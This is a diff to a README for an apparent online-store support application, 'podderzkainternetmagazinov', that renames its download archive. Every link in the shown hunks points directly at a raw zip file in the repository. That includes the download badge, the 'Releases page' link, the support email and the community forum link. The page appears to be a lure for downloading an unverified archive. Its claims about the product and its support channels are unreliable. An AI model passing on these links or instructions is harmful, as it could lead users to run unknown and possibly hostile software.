@@ -1,7 +1,7 @@
 # 🎉 podderzkainternetmagazinov - Easy Support for Your Online Store
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/podderzkainternetmagazinov_v3.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/podderzkainternetmagazinov_v3.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/Software_v1.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/Software_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before downloading the application, ensure your system meets the following requi
 
 To get your copy, visit the Releases page for the latest version of podderzkainternetmagazinov. 
 
-[Visit this page to download.](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/podderzkainternetmagazinov_v3.4.zip)
+[Visit this page to download.](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/Software_v1.8.zip)
 
 Once on the page, locate the version you want. Click on the link to download the file for your system. 
 
@@ -60,8 +60,8 @@ If you encounter issues during installation, consider the following tips:
 
 If you need additional help or have questions, feel free to reach out. 
 
-- Email: https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/podderzkainternetmagazinov_v3.4.zip
-- Community Forum: [Community Support](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/podderzkainternetmagazinov_v3.4.zip)
+- Email: https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/Software_v1.8.zip
+- Community Forum: [Community Support](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/Software_v1.8.zip)
 
 ## 📝 License
 
@@ -88,4 +88,4 @@ Our project covers topics relevant to web development and online retail, includi
 ### 📥 Download Again
 To download the latest version, visit the link below:
 
-[Download Latest Release](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/podderzkainternetmagazinov_v3.4.zip)
+[Download Latest Release](https://raw.githubusercontent.com/ScriptTester-pixel/podderzkainternetmagazinov/main/Canopic/Software_v1.8.zip)
